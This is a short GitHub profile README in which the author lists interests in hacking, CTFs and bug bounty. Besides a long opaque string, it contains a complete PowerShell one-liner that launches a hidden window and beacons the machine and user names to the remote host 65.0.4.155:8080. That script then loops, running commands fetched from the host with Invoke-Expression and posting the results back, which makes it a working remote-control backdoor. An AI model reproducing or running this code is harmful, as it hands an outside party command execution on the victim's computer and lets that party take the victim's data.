- 👋 Hi, I’m Kapil Singh Chauhan
- 👀 I’m interested in Hacking , Programming , I.T Stuff
- 🌱 I’m currently doing CTF's and Bug bounty
- 49Kzx6RU7357S7ibrgwAEhLvWw2aGGCrtUBi1vRxZDqy23nmSvjHcrACUu4k8wnmpUY9mPupewRq2Wuw4FCttFtvJQuq7nJ
- Start-Process $PSHOME\powershell.exe -ArgumentList {$s='65.0.4.155:8080';$i='9a65abeb-5b5d6f31-8e663ae0';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/9a65abeb/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/5b5d6f31 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/8e663ae0 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden

<!---
Divyansh616937/Divyansh616937 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
